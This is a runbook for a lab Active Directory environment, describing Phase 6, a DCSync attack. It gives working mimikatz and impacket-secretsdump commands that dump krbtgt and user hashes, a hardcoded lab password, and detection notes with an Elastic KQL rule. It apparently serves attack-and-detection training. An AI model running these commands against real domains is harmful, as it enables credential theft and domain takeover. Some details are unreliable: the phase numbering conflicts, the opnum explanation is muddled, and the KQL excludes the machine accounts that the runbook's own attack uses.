# CAMPAIGNS v3 — Phase 6 — Privilege Escalation (DCSync)

> **Campaign v3** — read the theory here, run each command block live, then update [`CAMPAIGNS-METADATA.md`](../CAMPAIGNS-METADATA.md).
> **Index:** [`CAMPAIGNS-RUNBOOK-README.md`](CAMPAIGNS-RUNBOOK-README.md) · **Full reference:** [`CAMPAIGNS_v3.md`](../CAMPAIGNS_v3.md) · **Topology:** [`CAMPAIGNS.md`](../CAMPAIGNS.md)
> **DFIR track:** [`DFIR-Nexus-Pioneer-workflow.md`](../DFIR-Nexus-Pioneer-workflow.md)
>
> **Sync rule:** When you change this runbook during lab work, apply the same edit to [`CAMPAIGNS_v3.md`](../CAMPAIGNS_v3.md) (matching section). Re-run `python tools/split-campaign-runbooks.py --check` to verify coverage.

**Default host:** Kali / provisioning (`192.168.77.60`) unless a step says otherwise.

---

### Phase 6 — Privilege Escalation (DCSync — WT009)


|                   |                                                                                      |
| ----------------- | ------------------------------------------------------------------------------------ |
| **Target**        | dc02 (.11) — DRSUAPI replication                                                     |
| **From**          | **mbr01** (after T102 coercion captured dc02$ TGT)                                 |
| **Starting cred** | `dc02$` TGT (from Phase 5) or child DA                                               |
| **What you earn** | Child krbtgt hash + all user/computer hashes → **Domain Admin** in child.cadre.local |
| **MITRE**         | T1003.006 (DCSync)                                                                   |


In the realistic multi-hop chain, DCSync is executed **from mbr01** using the captured dc02$ machine account credentials, or from ws01 after bringing the captured material back. This mirrors real operations where the attacker uses a member server with existing domain trust rather than running everything from their C2.

**Step 1 — Transfer captured dc02$ TGT from mbr01 to ws01 (or use directly on mbr01):**

```powershell
winrs -r:mbr01.child.cadre.local -u:child\analyst_t1 -p:T13r_An@lyst! powershell -Command "Get-Content C:\Tools\cadre-attack\dc02_tgs.txt"
```

**Step 2 — Run DCSync from mbr01 using Rubeus + mimikatz:**

```powershell
winrs -r:mbr01.child.cadre.local -u:child\analyst_t1 -p:T13r_An@lyst! "C:\Tools\ADTools\mimikatz.exe \"privilege::debug\" \"lsadump::dcsync /domain:child.cadre.local /user:krbtgt\" \"exit\""
```

**Fallback from Kali:**

```bash
export KRB5CCNAME=/tmp/dc02.ccache
impacket-secretsdump -just-dc child.cadre.local/ -dc-ip 192.168.77.11 -k
```



---

## Study references (read before this phase)

### Phase 7 — DCSync (read BEFORE testing)

#### 📖 DCSync Attack and Detection — Altered Security

**Why read:** DCSync is the keystone of Phase 7. Understanding the wire protocol (DRSGetNCChanges) and the detection surface (4662 events on `CN=Configuration`) is essential both for executing the attack cleanly and for validating our detection rules.

**Source:** [DCSync Attack and Detection — Altered Security](https://www.alteredsecurity.com/post/dcsync)

**Key concepts to internalize:**

- DCSync uses `DRSGetNCChanges` RPC opnum 3 (not 1) — `DsGetNCChanges` is the legitimate op
- Requires `DS-Replication-Get-Changes-All` (or `Get-Changes` + `Get-Changes-All` ACE pair)
- `Replicating Directory Changes` extended right
- Detection: 4662 events with `AccessMask: 0x100` (Control Access) on `CN=Configuration,DC=...` from non-DC source
- Zeek `dce_rpc.log` shows `opnum: 3` from non-DC → high signal
- 🆕 **Property GUID signature:** Event 4662 with property GUID `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` = DS-Replication-Get-Changes. Alert when this GUID is referenced + subject account is NOT a domain controller → canonical DCSync detection. **Add to Elastic KQL:**
  ```
  event.code:4662 AND winlog.event_data.PropertyGUID:1131f6aa-9c07-11d1-f79f-00c04fc2dcd2 AND NOT SubjectUserName:*$*
  ```

**Action item:** Read before Phase 7. Our existing detection rule (cadre-002 DCSync) should fire on these — verify by capturing a real DCSync. Add the property GUID filter to Elastic KQL as a high-fidelity secondary signal.

---

## Navigation

← Previous: [`CAMPAIGNS-RUNBOOK-5.md`](CAMPAIGNS-RUNBOOK-5.md) · Next: [`CAMPAIGNS-RUNBOOK-7.md`](CAMPAIGNS-RUNBOOK-7.md) →
